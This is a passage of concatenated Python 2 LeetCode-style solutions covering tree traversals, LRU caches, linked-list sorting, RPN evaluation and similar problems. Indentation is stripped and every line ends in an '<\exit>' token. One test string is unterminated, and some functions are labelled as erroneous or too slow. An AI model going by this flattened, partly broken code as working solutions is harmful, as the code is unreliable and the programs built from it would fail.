self.preTraverse_itr(root, lst)<\exit>
return lst<\exit>
def preTraverse(self, node, lst):<\exit>
if not node:<\exit>
return<\exit>
lst.append(node.val)<\exit>
self.preTraverse(node.left, lst)<\exit>
self.preTraverse(node.right, lst)<\exit>
def preTraverse_itr(self, root, lst):<\exit>
if not root:<\exit>
return<\exit>
stk = [root]<\exit>
while stk:<\exit>
node = stk.pop()<\exit>
lst.append(node.val)<\exit>
if node.right:<\exit>
stk.append(node.right)<\exit>
if node.left:<\exit>
stk.append(node.left)<\exit>
if __name__=="__main__":<\exit>
t1 = TreeNode(1)<\exit>
t1.left = TreeNode(2)<\exit>
print Solution().preorderTraversal(t1)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def postorderTraversal(self, root):<\exit>
lst = []<\exit>
self.postTraverse_itr(root, lst)<\exit>
return lst<\exit>
def postTraverse(self, node, lst):<\exit>
if not node:<\exit>
return<\exit>
self.postTraverse(node.left, lst)<\exit>
self.postTraverse(node.right, lst)<\exit>
lst.append(node.val)<\exit>
def postTraverse_itr(self, root, lst):<\exit>
if not root:<\exit>
return<\exit>
stk = [root]<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
lst.insert(0, cur.val)<\exit>
if cur.left:<\exit>
stk.append(cur.left)<\exit>
if cur.right:<\exit>
stk.append(cur.right)<\exit>
if __name__=="__main__":<\exit>
t1 = TreeNode(1)<\exit>
t1.left = TreeNode(2)<\exit>
print Solution().postorderTraversal(t1)<\exit>
class Node:<\exit>
def __init__(self, key, val):<\exit>
self.key = key<\exit>
self.val = val<\exit>
self.prev, self.next = None, None<\exit>
class LRUCache:<\exit>
def __init__(self, capacity: int):<\exit>
self.head = Node(None, None)<\exit>
self.tail = Node(None, None)<\exit>
self.head.next = self.tail<\exit>
self.tail.prev = self.head<\exit>
self.cap = capacity<\exit>
self.map = {}<\exit>
def get(self, key: int) -> int:<\exit>
if key in self.map:<\exit>
node = self.map[key]<\exit>
self._remove(key)<\exit>
self._appendleft(node)<\exit>
return node.val<\exit>
return -1<\exit>
def put(self, key: int, value: int) -> None:<\exit>
if key in self.map:<\exit>
self._remove(key)<\exit>
elif len(self.map) >= self.cap:<\exit>
node = self.tail.prev<\exit>
self._remove(node.key)<\exit>
node = Node(key, value)<\exit>
self._appendleft(node)<\exit>
def _appendleft(self, node: Node):<\exit>
self.map[node.key] = node<\exit>
nxt = self.head.next<\exit>
self.head.next = node<\exit>
node.prev = self.head<\exit>
node.next = nxt<\exit>
nxt.prev = node<\exit>
def _remove(self, key: int):<\exit>
node = self.map[key]<\exit>
prev = node.prev<\exit>
nxt = node.next<\exit>
prev.next = nxt<\exit>
nxt.prev = prev<\exit>
del self.map[key]<\exit>
class Node(object):<\exit>
def __init__(self, key, val):<\exit>
self.key = key<\exit>
self.val = val<\exit>
self.pre, self.next = None, None<\exit>
class LRUCache(object):<\exit>
def __init__(self, capacity):<\exit>
self.cap = capacity<\exit>
self.map = {}<\exit>
self.head = None<\exit>
self.tail = None<\exit>
def get(self, key):<\exit>
if key in self.map:<\exit>
cur = self.map[key]<\exit>
self._elevate(cur)<\exit>
return cur.val<\exit>
return -1<\exit>
def set(self, key, value):<\exit>
if key in self.map:<\exit>
cur = self.map[key]<\exit>
cur.val = value<\exit>
self._elevate(cur)<\exit>
else:<\exit>
cur = Node(key, value)<\exit>
self.map[key] = cur<\exit>
self._appendleft(cur)<\exit>
if len(self.map) > self.cap:<\exit>
last = self._pop()<\exit>
del self.map[last.key]<\exit>
def _appendleft(self, cur):<\exit>
if not self.head and not self.tail:<\exit>
self.head = cur<\exit>
self.tail = cur<\exit>
return<\exit>
head = self.head<\exit>
cur.next, cur.pre, head.pre = head, None, cur<\exit>
self.head = cur<\exit>
def _pop(self):<\exit>
last = self.tail<\exit>
if self.head == self.tail:<\exit>
self.head, self.tail = None, None<\exit>
return last<\exit>
pre = last.pre<\exit>
pre.next = None<\exit>
self.tail = pre<\exit>
return last<\exit>
def _elevate(self, cur):<\exit>
pre, nxt = cur.pre, cur.next<\exit>
if not pre:<\exit>
return<\exit>
elif not nxt:<\exit>
assert self.tail == cur<\exit>
self._pop()<\exit>
else:<\exit>
pre.next, nxt.pre = nxt, pre<\exit>
self._appendleft(cur)<\exit>
class LRUCache_TLE(object):<\exit>
def __init__(self, capacity):<\exit>
self.capacity = capacity<\exit>
self.q = []<\exit>
self.dic = {}<\exit>
def get(self, key):<\exit>
if key in self.dic:<\exit>
self.q.remove(key)<\exit>
self.q.insert(0, key)<\exit>
return self.dic[key]<\exit>
else:<\exit>
return -1<\exit>
def set(self, key, value):<\exit>
if key in self.dic:<\exit>
self.q.remove(key)<\exit>
self.q.insert(0, key)<\exit>
else:<\exit>
if len(self.q)+1 <= self.capacity:<\exit>
self.q.insert(0, key)<\exit>
else:<\exit>
self.dic.pop(self.q.pop())<\exit>
self.q.insert(0, key)<\exit>
self.dic[key] = value<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def insertionSortList_TLE(self, head):<\exit>
comparator = lambda x, y: cmp(x.val, y.val)<\exit>
dummy_head = ListNode(0)<\exit>
dummy_head.next = head<\exit>
closed_tail = dummy_head.next<\exit>
while(closed_tail and closed_tail.next):<\exit>
open_head = closed_tail.next<\exit>
ptr_before = dummy_head<\exit>
ptr = dummy_head.next<\exit>
while(ptr_before):<\exit>
if comparator(ptr, open_head)>0:<\exit>
ptr_before.next = open_head<\exit>
closed_tail.next = open_head.next<\exit>
open_head.next = ptr<\exit>
break<\exit>
if ptr==open_head:<\exit>
closed_tail = closed_tail.next<\exit>
break<\exit>
ptr_before = ptr_before.next<\exit>
ptr = ptr.next<\exit>
return dummy_head.next<\exit>
def insertionSortList(self, head):<\exit>
comparator = lambda x, y: cmp(x.val, y.val)<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
closed_tail = head<\exit>
while (closed_tail and closed_tail.next):<\exit>
open_head = closed_tail.next<\exit>
open_head_next = closed_tail.next.next<\exit>
if not comparator(closed_tail, open_head)<=0:<\exit>
pre = dummy<\exit>
while comparator(pre.next, open_head)<0:<\exit>
pre = pre.next<\exit>
open_head.next = pre.next<\exit>
pre.next = open_head<\exit>
closed_tail.next = open_head_next<\exit>
else:<\exit>
closed_tail = closed_tail.next<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
import random<\exit>
lst = [ListNode(i) for i in random.sample(xrange(-1000, 1000), 1000)]<\exit>
for i in range(len(lst)):<\exit>
try:<\exit>
lst[i].next = lst[i+1]<\exit>
except IndexError:<\exit>
lst[i].next = None<\exit>
head = Solution().insertionSortList(lst[0])<\exit>
current = head<\exit>
for i in range(len(lst)):<\exit>
print current.val<\exit>
current = current.next<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def sortList_array(self, head):<\exit>
if head==None:<\exit>
return None<\exit>
lst = []<\exit>
current = head<\exit>
while(current):<\exit>
lst.append(current)<\exit>
current = current.next<\exit>
comparator = lambda x, y: cmp(x.val, y.val)<\exit>
lst = sorted(lst, comparator)<\exit>
for i in range(len(lst)-1):<\exit>
lst[i].next = lst[i+1]<\exit>
lst[-1].next = None<\exit>
return lst[0]<\exit>
def sortList(self, head):<\exit>
if not head or not head.next:<\exit>
return head<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
slow_pre = dummy<\exit>
fast_pre = dummy<\exit>
while fast_pre.next and fast_pre.next.next:<\exit>
fast_pre = fast_pre.next.next<\exit>
slow_pre = slow_pre.next<\exit>
mid_head = slow_pre.next<\exit>
dummy_mid = ListNode(0)<\exit>
slow_pre.next = None<\exit>
head = self.sortList(head)<\exit>
mid_head = self.sortList(mid_head)<\exit>
dummy.next = head<\exit>
dummy_mid.next = mid_head<\exit>
pre = dummy<\exit>
pre_mid = dummy_mid<\exit>
while pre.next and pre_mid.next:<\exit>
if pre.next.val > pre_mid.next.val:<\exit>
pre.next, pre_mid.next.next, pre_mid.next = pre_mid.next, pre.next, pre_mid.next.next<\exit>
pre = pre.next<\exit>
else:<\exit>
pre = pre.next<\exit>
if  pre_mid.next:<\exit>
pre.next = pre_mid.next<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
length = 5<\exit>
lst = [ListNode(length-i) for i in range(length)]<\exit>
for i in range(length-1):<\exit>
lst[i].next = lst[i+1]<\exit>
head = Solution().sortList(lst[0])<\exit>
cur = head<\exit>
while(cur):<\exit>
print cur.val<\exit>
cur = cur.next<\exit>
class Point:<\exit>
def __init__(self, a=0, b=0):<\exit>
self.x = a<\exit>
self.y = b<\exit>
class Solution:<\exit>
def maxPoints_complicated(self, points):<\exit>
hash_map = {}<\exit>
length = len(points)<\exit>
for i in xrange(length):<\exit>
for j in xrange(i+1, length):<\exit>
point1 = points[i]<\exit>
point2 = points[j]<\exit>
if point1.x == point2.x:<\exit>
key = (1 << 32, point1.x)<\exit>
else:<\exit>
slope = float(point1.y-point2.y)/(point1.x-point2.x)<\exit>
intersection = slope*point1.x - point1.y<\exit>
slope = int(slope*1000)<\exit>
intersection = int(intersection*1000)<\exit>
key = (slope, intersection)<\exit>
if key not in hash_map:<\exit>
hash_map[key] = [0 for _ in points]<\exit>
hash_map[key][i] = 1<\exit>
hash_map[key][j] = 1<\exit>
if (length<=1):<\exit>
return length<\exit>
if(len(hash_map)==0):<\exit>
return 0<\exit>
maxa = -1<<32<\exit>
for key, item in hash_map.items():<\exit>
current = item.count(1)<\exit>
if current>maxa:<\exit>
maxa = current<\exit>
return maxa<\exit>
def maxPoints(self, points):<\exit>
maxa = -1<<32<\exit>
length = len(points)<\exit>
if (length<=1):<\exit>
return length<\exit>
for i in xrange(length):<\exit>
hash_map = {}<\exit>
duplicate = 1<\exit>
for j in xrange(length):<\exit>
if i==j:<\exit>
continue<\exit>
point1 = points[i]<\exit>
point2 = points[j]<\exit>
if point1.x==point2.x and point1.y==point2.y:<\exit>
duplicate += 1<\exit>
continue<\exit>
if point1.x==point2.x:<\exit>
key = 1<<32<\exit>
else:<\exit>
slope = float(point1.y-point2.y)/(point1.x-point2.x)<\exit>
slope = int(slope*10000)<\exit>
key = slope<\exit>
if key not in hash_map:<\exit>
hash_map[key] = 0<\exit>
hash_map[key]+=1<\exit>
if hash_map:<\exit>
max_key = max(hash_map, key=hash_map.get)<\exit>
max_value = hash_map[max_key]<\exit>
else:<\exit>
max_value  = 0<\exit>
maxa = max(maxa, max_value+duplicate)<\exit>
return maxa<\exit>
if __name__=="__main__":<\exit>
points = [(560, 248), (0, 16), (30, 250), (950, 187), (630, 277), (950, 187), (-212, -268), (-287, -222), (53, 37),<\exit>
(-280, -100), (-1, -14), (-5, 4), (-35, -387), (-95, 11), (-70, -13), (-700, -274), (-95, 11), (-2, -33),<\exit>
(3, 62), (-4, -47), (106, 98), (-7, -65), (-8, -71), (-8, -147), (5, 5), (-5, -90), (-420, -158),<\exit>
(-420, -158), (-350, -129), (-475, -53), (-4, -47), (-380, -37), (0, -24), (35, 299), (-8, -71), (-2, -6),<\exit>
(8, 25), (6, 13), (-106, -146), (53, 37), (-7, -128), (-5, -1), (-318, -390), (-15, -191), (-665, -85),<\exit>
(318, 342), (7, 138), (-570, -69), (-9, -4), (0, -9), (1, -7), (-51, 23), (4, 1), (-7, 5), (-280, -100),<\exit>
(700, 306), (0, -23), (-7, -4), (-246, -184), (350, 161), (-424, -512), (35, 299), (0, -24), (-140, -42),<\exit>
(-760, -101), (-9, -9), (140, 74), (-285, -21), (-350, -129), (-6, 9), (-630, -245), (700, 306), (1, -17),<\exit>
(0, 16), (-70, -13), (1, 24), (-328, -260), (-34, 26), (7, -5), (-371, -451), (-570, -69), (0, 27),<\exit>
(-7, -65), (-9, -166), (-475, -53), (-68, 20), (210, 103), (700, 306), (7, -6), (-3, -52), (-106, -146),<\exit>
(560, 248), (10, 6), (6, 119), (0, 2), (-41, 6), (7, 19), (30, 250)]<\exit>
points = [Point(point[0], point[1]) for point in points]<\exit>
print Solution().maxPoints(points)<\exit>
assert Solution().maxPoints(points)==22<\exit>
class Solution(object):<\exit>
def evalRPN(self, tokens):<\exit>
ops = ["+", "-", "*", "/"]<\exit>
def arith(a, b, op):<\exit>
if (op == "+"):<\exit>
return a+b<\exit>
if (op == "-"):<\exit>
return a-b<\exit>
if (op == "/"):<\exit>
return int(float(a)/b)<\exit>
if (op == "*"):<\exit>
return a*b<\exit>
stack = []<\exit>
for token in tokens:<\exit>
if token not in ops:<\exit>
stack.append(int(token))<\exit>
else:<\exit>
arg2 = stack.pop()<\exit>
arg1 = stack.pop()<\exit>
result = arith(arg1, arg2, token)<\exit>
stack.append(result)<\exit>
return stack.pop()<\exit>
if __name__ == "__main__":<\exit>
assert Solution().evalRPN(["10", "6", "9", "3", "+", "-11", "*", "/", "*", "17", "+", "5", "+"]) == 22<\exit>
class Solution:<\exit>
def reverseWords(self, s):<\exit>
words_lst = s.split()<\exit>
words_lst = reversed(words_lst)<\exit>
return ' '.join(words_lst)<\exit>
class Solution(object):<\exit>
def maxProduct_oneline(self, nums):<\exit>
return max(reduce(lambda A, n: [max(A), min(n, A[1]*n, A[2]*n), max(n, A[1]*n, A[2]*n)], nums[1:], [nums[0]]*3))<\exit>
def maxProduct(self, nums):<\exit>
small = nums[0]<\exit>
large = nums[0]<\exit>
maxa = nums[0]<\exit>
for a in nums[1:]:<\exit>
small, large = min(a, small*a, large*a), max(a, small*a, large*a)<\exit>
maxa = max(maxa, small, large)<\exit>
return maxa<\exit>
def maxProduct_error2(self, nums):<\exit>
if len(nums) < 2:<\exit>
return max(nums)<\exit>
n = len(nums)<\exit>
F_pos = [0 for _ in xrange(n+1)]<\exit>
F_neg = [0 for _ in xrange(n+1)]<\exit>
maxa = 1<\exit>
for i in xrange(1, n+1):<\exit>
v = nums[i-1]<\exit>
if v > 0:<\exit>
F_pos[i] = F_pos[i-1]*v if F_pos[i-1] != 0 else v<\exit>
F_neg[i] = F_neg[i-1]*v<\exit>
elif v == 0:<\exit>
F_pos[i], F_neg[i] = 0, 0<\exit>
else:<\exit>
F_neg[i] = min(0, F_pos[i-1]*v)<\exit>
F_pos[i] = max(0, F_neg[i-1]*v)<\exit>
maxa = max(maxa, F_pos[i])<\exit>
return maxa<\exit>
def maxProduct_error(self, A):<\exit>
if not A:<\exit>
return<\exit>
length = len(A)<\exit>
if length==1:<\exit>
return A[0]<\exit>
dp = [-1 for _ in xrange(length+1)]<\exit>
dp[length] = 0<\exit>
for i in xrange(length-1, -1, -1):<\exit>
if A[i]<0:<\exit>
dp[i] = dp[i+1]+1<\exit>
elif A[i]==0:<\exit>
dp[i] = 0<\exit>
else:<\exit>
dp[i] = dp[i+1]<\exit>
global_max = -1<<32<\exit>
cur = 0<\exit>
for ind, val in enumerate(A):<\exit>
if cur!=0:<\exit>
cur *= val<\exit>
else:<\exit>
cur = val<\exit>
if cur<0 and dp[ind+1]<1:<\exit>
cur = 0<\exit>
global_max = max(global_max, cur)<\exit>
return global_max<\exit>
def maxProduct_dp(self, A):<\exit>
if not A:<\exit>
return<\exit>
length = len(A)<\exit>
if length==1:<\exit>
return A[0]<\exit>
dp = [-1 for _ in xrange(length+1)]<\exit>
dp[length] = 0<\exit>
for i in xrange(length-1, -1, -1):<\exit>
if A[i]<0:<\exit>
dp[i] = dp[i+1]+1<\exit>
elif A[i]==0:<\exit>
dp[i] = 0<\exit>
else:<\exit>
dp[i] = dp[i+1]<\exit>
global_max = -1<<32<\exit>
cur = 0<\exit>
start_ptr = 0<\exit>
end_ptr = 0<\exit>
while end_ptr<length:<\exit>
if cur!=0:<\exit>
cur *= A[end_ptr]<\exit>
else:<\exit>
cur = A[end_ptr]<\exit>
start_ptr = end_ptr<\exit>
end_ptr += 1<\exit>
if cur<0 and dp[end_ptr]<1:<\exit>
while start_ptr<=end_ptr and A[start_ptr]>0:<\exit>
cur /= A[start_ptr]<\exit>
start_ptr += 1<\exit>
if A[start_ptr]<0:<\exit>
cur /= A[start_ptr]<\exit>
start_ptr += 1<\exit>
if start_ptr==end_ptr:<\exit>
cur = 0<\exit>
global_max = max(global_max, cur)<\exit>
return global_max<\exit>
if __name__=="__main__":<\exit>
print Solution().maxProduct([2,3,-2,4])<\exit>
assert Solution().maxProduct([2,-5,-2,-4,3])==24<\exit>
assert Solution().maxProduct([-2, 0, -1])==0<\exit>
assert Solution().maxProduct([-2])==-2<\exit>
assert Solution().maxProduct([2, 3, -2, 4, -2])==96<\exit>
assert Solution().maxProduct([2, 3, -2, 4, 0, -2])==6<\exit>
assert Solution().maxProduct([2,3,-2,4])==6<\exit>
import sys<\exit>
class Solution(object):<\exit>
def findMin(self, A):<\exit>
lo = 0<\exit>
hi = len(A)<\exit>
mini = sys.maxint<\exit>
while lo < hi:<\exit>
mid = (lo+hi)/2<\exit>
mini = min(mini, A[mid])<\exit>
if A[lo] <= A[mid] <= A[hi-1]:<\exit>
return min(mini, A[lo])<\exit>
elif A[lo] > A[mid] < A[hi-1]:<\exit>
hi = mid<\exit>
else:<\exit>
lo = mid+1<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
num = [7, 1, 2, 3, 4, 5, 6]<\exit>
assert Solution().findMin(num) == 1<\exit>
import sys<\exit>
class Solution(object):<\exit>
def findMin(self, A):<\exit>
lo = 0<\exit>
hi = len(A)<\exit>
mini = sys.maxint<\exit>
while lo < hi:<\exit>
mid = (lo+hi)/2<\exit>
mini = min(mini, A[mid])<\exit>
if A[lo] == A[mid]:<\exit>
lo += 1<\exit>
elif A[lo] < A[mid] <= A[hi-1]:<\exit>
return min(mini, A[lo])<\exit>
elif A[lo] > A[mid] <= A[hi-1]:<\exit>
hi = mid<\exit>
else:<\exit>
lo = mid+1<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
num = [7, 1, 2, 2, 3, 4, 5, 6]<\exit>
assert Solution().findMin(num) == 1<\exit>
class MinStack:<\exit>
def __init__(self):<\exit>
self.stk = []<\exit>
self.non_asc = []<\exit>
def push(self, x):<\exit>
self.stk.append(x)<\exit>
if len(self.non_asc) == 0 or x <= self.non_asc[-1]:<\exit>
self.non_asc.append(x)<\exit>
def pop(self):<\exit>
x = self.stk.pop()<\exit>
if x == self.non_asc[-1]:<\exit>
self.non_asc.pop()<\exit>
def top(self):<\exit>
return self.stk[-1]<\exit>
def getMin(self):<\exit>
return self.non_asc[-1]<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def upsideDownBinaryTree(self, root):<\exit>
if not root or not root.left:<\exit>
return root<\exit>
left, right = root.left, root.right<\exit>
root_new = self.upsideDownBinaryTree(root.left)<\exit>
left.left, left.right = right, root<\exit>
root.left, root.right = None, None<\exit>
return root_new<\exit>
class SolutionComplex(object):<\exit>
def __init__(self):<\exit>
self.root = TreeNode(0)<\exit>
self.cur_new = self.root<\exit>
def upsideDownBinaryTree(self, root):<\exit>
if not root:<\exit>
return<\exit>
self.traverse(root)<\exit>
return self.root<\exit>
def traverse(self, cur):<\exit>
if not cur:<\exit>
return<\exit>
if not cur.left:<\exit>
self.cur_new.val = cur.val<\exit>
return<\exit>
self.traverse(cur.left)<\exit>
if cur.right: self.cur_new.left = TreeNode(cur.right.val)<\exit>
self.cur_new.right = TreeNode(cur.val)<\exit>
self.cur_new = self.cur_new.right<\exit>
def read4(buf):<\exit>
return 0<\exit>
class Solution(object):<\exit>
def read(self, buf, n):<\exit>
idx = 0<\exit>
while idx < n:<\exit>
buf4 = ["" for _ in xrange(4)]<\exit>
r = read4(buf4)<\exit>
if idx+r < n:<\exit>
buf[idx:idx+r] = buf4[:r]<\exit>
idx += r<\exit>
if r < 4: break<\exit>
else:<\exit>
buf[idx:n] = buf4[:n-idx]<\exit>
idx = n<\exit>
return idx<\exit>
def read4(buf):<\exit>
return 0<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.prev = []<\exit>
def read(self, buf, n):<\exit>
l = min(len(self.prev), n)<\exit>
buf[:l] = self.prev[:l]<\exit>
self.prev = self.prev[l:]<\exit>
idx = l<\exit>
while idx < n:<\exit>
buf4 = ["" for _ in xrange(4)]<\exit>
r = read4(buf4)<\exit>
if idx+r < n:<\exit>
buf[idx:idx+r] = buf4[:r]<\exit>
idx += r<\exit>
if r < 4: return idx<\exit>
else:<\exit>
buf[idx:n] = buf4[:n-idx]<\exit>
self.prev = buf4[n-idx:r]<\exit>
idx = n<\exit>
return idx<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def lengthOfLongestSubstringTwoDistinct(self, s):<\exit>
m = defaultdict(int)<\exit>
i = 0<\exit>
j = 0<\exit>
maxa = 0<\exit>
for j in xrange(len(s)):<\exit>
m[s[j]] += 1<\exit>
while len(m) > 2:<\exit>
m[s[i]] -= 1<\exit>
if m[s[i]] == 0:<\exit>
del m[s[i]]<\exit>
i += 1<\exit>
maxa = max(maxa, j-i+1)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lengthOfLongestSubstringTwoDistinct("ecebaaaaaacdbb") == 7<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def getIntersectionNode(self, headA, headB):<\exit>
l_a = self._get_len(headA)<\exit>
l_b = self._get_len(headB)<\exit>
if l_a > l_b:<\exit>
l_a, l_b = l_b, l_a<\exit>
headA, headB = headB, headA<\exit>
cur_a = headA<\exit>
cur_b = headB<\exit>
for i in xrange(l_b-l_a):<\exit>
cur_b = cur_b.next<\exit>
while cur_a != cur_b:<\exit>
cur_a = cur_a.next<\exit>
cur_b = cur_b.next<\exit>
return cur_a<\exit>
def _get_len(self, head):<\exit>
n = 0<\exit>
cur = head<\exit>
while cur:<\exit>
n += 1<\exit>
cur = cur.next<\exit>
return n<\exit>
class Solution(object):<\exit>
def isOneEditDistance(self, s, t):<\exit>
m, n = len(s), len(t)<\exit>
if m > n: return self.isOneEditDistance(t, s)<\exit>
if n-m > 1: return False<\exit>
diff = 0<\exit>
i, j = 0, 0<\exit>
while i < m and j < n and diff < 2:<\exit>
if s[i] == t[j]:<\exit>
i += 1<\exit>
j += 1<\exit>
else:<\exit>
if m != n:<\exit>
j += 1<\exit>
else:<\exit>
i += 1<\exit>
j += 1<\exit>
diff += 1<\exit>
return diff == 1 or diff == 0 and m != n<\exit>
class Solution1(object):<\exit>
def isOneEditDistance(self, s, t):<\exit>
m, n = len(s), len(t)<\exit>
if m > n: return self.isOneEditDistance(t, s)<\exit>
if n-m > 1: return False<\exit>
diff = 0<\exit>
i, j = iter(s), iter(t)<\exit>
a, b = next(i, None), next(j, None)<\exit>
while a and b and diff < 2:<\exit>
if a == b:<\exit>
a, b = next(i, None), next(j, None)<\exit>
else:<\exit>
if m != n:<\exit>
b = next(j, None)<\exit>
else:<\exit>
a, b = next(i, None), next(j, None)<\exit>
diff += 1<\exit>
return diff == 1 or diff == 0 and m != n<\exit>
import sys<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.A = None<\exit>
def findPeakElement(self, nums):<\exit>
self.A = nums<\exit>
n = len(self.A)<\exit>
if n < 2:<\exit>
return 0<\exit>
l = 0<\exit>
h = n<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if self._get(m-1) < self._get(m) > self._get(m+1):<\exit>
return m<\exit>
elif self._get(m+1) > self._get(m):<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
return -1<\exit>
def _get(self, i):<\exit>
if i < 0 or i >= len(self.A):<\exit>
return -sys.maxint-1<\exit>
else:<\exit>
return self.A[i]<\exit>
def findPeakElement_complicated(self, nums):<\exit>
n = len(nums)<\exit>
if n < 2:<\exit>
return 0<\exit>
l = 0<\exit>
h = n<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if m == 0 and nums[m] > nums[m+1]:<\exit>
return m<\exit>
elif m == n-1 and nums[m] > nums[m-1]:<\exit>
return m<\exit>
elif nums[m-1] < nums[m] > nums[m+1]:<\exit>
return m<\exit>
elif m+1 < n and nums[m+1] > nums[m]:<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
return -1<\exit>
class Solution(object):<\exit>
def findMissingRanges(self, nums, lower, upper):<\exit>
n = len(nums)<\exit>
ret = []<\exit>
if not nums:<\exit>
ret.append([lower, upper])<\exit>
return map(self.mapper, ret)<\exit>
if nums[0] > lower:<\exit>
ret.append([lower, nums[0]-1])<\exit>
for i in xrange(1, n):<\exit>
if nums[i] > nums[i-1]+1:<\exit>
ret.append([nums[i-1]+1, nums[i]-1])<\exit>
if upper > nums[-1]:<\exit>
ret.append([nums[-1]+1, upper])<\exit>
return map(self.mapper, ret)<\exit>
def mapper(self, x):<\exit>
if x[0] == x[1]:<\exit>
return "%d" % x[0]<\exit>
else:<\exit>
return "%d->%d" % tuple(x)<\exit>
import sys<\exit>
class Solution:<\exit>
def maximumGap(self, nums):<\exit>
n = len(nums)<\exit>
if n < 2:<\exit>
return 0<\exit>
g_min = min(nums)<\exit>
g_max = max(nums)<\exit>
bin_width = max(1, (g_max-g_min)/n)<\exit>
bins_min = {}<\exit>
bins_max = {}<\exit>
for v in nums:<\exit>
bin_id = (v-g_min)/bin_width<\exit>
bins_min[bin_id] = min(bins_min.get(bin_id, sys.maxint), v)<\exit>
bins_max[bin_id] = max(bins_max.get(bin_id, -sys.maxint-1), v)<\exit>
max_gap = 0<\exit>
pre_max = g_min<\exit>
for i in xrange(0, (g_max-g_min)/bin_width+1):<\exit>
if i in bins_min:<\exit>
max_gap = max(max_gap, bins_min[i]-pre_max)<\exit>
pre_max = bins_max[i]<\exit>
return max_gap<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maximumGap([1, 1000]) == 999<\exit>
class Solution:<\exit>
def compareVersion(self, version1, version2):<\exit>
version1 = map(int, version1.split("."))<\exit>
version2 = map(int, version2.split("."))<\exit>
n1 = len(version1)<\exit>
n2 = len(version2)<\exit>
for i in xrange(min(n1, n2)):<\exit>
if version1[i] == version2[i]:<\exit>
pass<\exit>
else:<\exit>
return -1 if version1[i] < version2[i] else 1<\exit>
if n1 == n2 or n1 > n2 and all(map(lambda x: x == 0, version1[n2:])) or \<\exit>
n1 < n2 and all(map(lambda x: x == 0, version2[n1:])):<\exit>
return 0<\exit>
return -1 if n1 < n2 else 1<\exit>
class Solution:<\exit>
def fractionToDecimal(self, numerator, denominator):<\exit>
sign = 1 if numerator*denominator >= 0 else -1<\exit>
numerator = abs(numerator)<\exit>
denominator = abs(denominator)<\exit>
int_part = numerator/denominator<\exit>
frac_part = numerator-int_part*denominator<\exit>
if frac_part:<\exit>
decimal_part = self.frac(numerator-int_part*denominator, denominator)<\exit>
ret = str(int_part)+"."+decimal_part<\exit>
else:<\exit>
ret = str(int_part)<\exit>
if sign < 0:<\exit>
ret = "-" + ret<\exit>
return ret<\exit>
def frac(self, num, deno):<\exit>
ret = []<\exit>
d = {}<\exit>
i = 0<\exit>
while num:<\exit>
num *= 10<\exit>
q = num/deno<\exit>
r = num%deno<\exit>
if (q, r) in d:<\exit>
ret.append(")")<\exit>
ret.insert(d[(q, r)], "(")<\exit>
return "".join(ret)<\exit>
ret.append(str(q))<\exit>
d[(q, r)] = i<\exit>
i += 1<\exit>
num -= q*deno<\exit>
return "".join(ret)<\exit>
class Solution_error:<\exit>
def fractionToDecimal(self, numerator, denominator):<\exit>
int_part = numerator/denominator<\exit>
fract_part = numerator-int_part*denominator<\exit>
if fract_part:<\exit>
decimal_part = self.frac(numerator-int_part*denominator, denominator)<\exit>
ret = str(int_part)+"."+decimal_part<\exit>
else:<\exit>
ret = str(int_part)<\exit>
return ret<\exit>
def frac(self, num, deno):<\exit>
ret = []<\exit>
d = {}<\exit>
i = 0<\exit>
while num:<\exit>
l = 0<\exit>
while num < deno:<\exit>
num *= 10<\exit>
l += 1<\exit>
r = num/deno<\exit>
if r in d:<\exit>
ret.append(")")<\exit>
ret.insert(d[r]-(l-1), "(")<\exit>
return "".join(ret)<\exit>
for _ in xrange(l-1):<\exit>
ret.append("0")<\exit>
i += 1<\exit>
ret.append(str(r))<\exit>
d[r] = i<\exit>
i += 1<\exit>
num -= r*deno<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().fractionToDecimal(1, 333) == "0.(003)"<\exit>
assert Solution().fractionToDecimal(1, 90) == "0.0(1)"<\exit>
assert Solution().fractionToDecimal(-50, 8) == "-6.25"<\exit>
assert Solution().fractionToDecimal(7, -12) == "-0.58(3)<\exit>
class Solution(object):<\exit>
def twoSum(self, numbers, target):<\exit>
n = len(numbers)<\exit>
i = 0<\exit>
j = n-1<\exit>
while i < j:<\exit>
s = numbers[i] + numbers[j]<\exit>
if s == target:<\exit>
return i+1, j+1<\exit>
elif s < target:<\exit>
i += 1<\exit>
else:<\exit>
j -= 1<\exit>
return -1, -1<\exit>
class Solution:<\exit>
def convertToTitle(self, n):<\exit>
sb = []<\exit>
while n:<\exit>
n -= 1<\exit>
sb.append(chr(ord("A")+n%26))<\exit>
n /= 26<\exit>
return "".join(reversed(sb))<\exit>
class Solution:<\exit>
def majorityElement(self, nums):<\exit>
mjr = nums[0]<\exit>
cnt = 0<\exit>
for i, v in enumerate(nums):<\exit>
if mjr == v:<\exit>
cnt += 1<\exit>
else:<\exit>
cnt -= 1<\exit>
if cnt < 0:<\exit>
mjr = v<\exit>
cnt = 1<\exit>
return mjr<\exit>
